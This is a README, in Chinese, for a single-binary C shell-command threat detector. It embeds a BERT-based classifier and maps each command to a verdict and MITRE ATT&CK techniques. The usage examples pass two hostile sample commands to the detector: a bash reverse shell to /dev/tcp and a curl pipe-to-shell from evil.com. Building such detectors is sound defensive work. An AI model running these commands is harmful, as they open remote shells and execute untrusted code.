# HyperIDs — 单二进制静态编译版

所有内容（模型权重 / 词表 / 标签与 MITRE 规则）都编译进**一个静态链接的 C 二进制**。
只需这一个二进制即可完成 shell 命令威胁检测，无任何运行时依赖（无 ONNX Runtime、无 Python、无 .so）。

## 产物

| 项 | 值 |
|---|---|
| 二进制 | `hyperids`（约 119MB，内含 fp32 模型权重） |
| 链接 | **statically linked** |
| 峰值 RSS | ~70 MiB（模型权重以 demand-paged mmap 加载） |
| 模型 | GLiClass uni-encoder + `prajjwal1/bert-small`（29.8M，4 层 / 512 维 / 8 头） |
| 标签 | verdict 3（benign/suspicious/malicious）+ action 28 = 31；MITRE 由规则推导 |

## 用法

```bash
# 单条命令
./hyperids 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'

# 从 stdin 逐行读取（每行一条命令，输出 verdict）
./hyperids -

# JSON 输出
./hyperids --json 'curl http://evil.com/x.sh | sh'
```

输出示例：

```
verdict   : malicious
verdict_probs: benign=0.0000 suspicious=0.0000 malicious=1.0000
actions   : command_and_control, reverse_shell
tactics   : command_and_control, initial_access
techniques: T1059, T1071
```

## 与 Python 推理的对齐

C 引擎与 `model/predict.py`（PyTorch）在 test 集抽样 100 条上 **verdict + actions 100/100 一致**。
推理约定与 Python 端完全一致：verdict = softmax(argmax)，action = sigmoid(≥0.5)，
MITRE = `schema.derive_attck(actions)` 规则表确定性推导。

## 从源码构建

```bash
# 1) 导出权重 + vocab + 标签表
PYTHONPATH=. python release/export_c_weights.py
PYTHONPATH=. python release/export_c_labels.py

# 2) 静态编译（ld -r -b binary 嵌入权重/vocab）
cd release && make            # 产物 build/hyperids
make STATIC=0                 # 若需动态链接 libc 的版本
```

构建依赖：`cc`（gcc/clang）、`ld`（binutils）、`make`。无第三方库（仅 `-lm`）。

## 实现说明

- 推理引擎为纯 C：BERT self-attention + FFN（gelu）+ 2 个 GLiClass projector + 点积 scorer。
- WordPiece tokenizer 为纯 C 实现（basic tokenization + 贪心最长匹配 + `##` 子词 + UTF-8 序列）。
- 权重布局与导出顺序见 `export_c_weights.py` 头部注释，C 端 `load_model_mem` 按同序读取。
- 标签前缀 token / class 位置 / MITRE 位图由 `export_c_labels.py` 生成 `hyperids_labels.h`。
